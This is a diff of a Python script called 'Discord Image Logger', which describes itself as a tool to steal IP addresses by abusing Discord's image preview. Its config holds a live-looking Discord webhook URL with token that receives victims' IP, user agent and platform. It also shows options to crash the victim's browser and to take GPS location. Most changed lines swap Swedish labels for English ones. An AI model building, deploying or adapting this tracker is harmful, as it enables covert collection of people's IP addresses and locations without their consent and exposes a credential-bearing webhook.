@@ -5,8 +5,8 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = programmet
-__description__ = programmets beskrivning - ingen information 
+__app__ = "Discord Image Logger"
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
 
@@ -14,20 +14,21 @@ config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1344723646924591335/7GDfLRtDXIYA4B10PdpahTcSuWHO9z35whRO_k_cHl5A4yD7fuIVfs_ovQZV44P-8LHH",
     "image": "https://preview.redd.it/can-someone-help-me-im-stuck-in-this-loading-screen-when-im-v0-ah6jkip092oa1.png", # You can also have a custom image by using a URL argument
+                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "ip-tagaren", # Set this to the name you want the webhook to have
+    "username": "Image Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "ingen information angedd", # Message to show
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -81,7 +82,7 @@ def reportError(error):
         {
             "title": "Image Logger - Error",
             "color": config["color"],
-            "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```",
+            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
         }
     ],
 })
@@ -98,9 +99,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "ip-tagare - Länk skickad!",
+            "title": "Image Logger - Link Sent",
             "color": config["color"],
-            "description": f"Länk skickad!\nDu bör få ip-address inom kort.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
@@ -143,7 +144,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "ip-tagare - IP loggad",
+            "title": "Image Logger - IP Logged",
             "color": config["color"],
             "description": f"""**A User Opened the Original Image!**
 
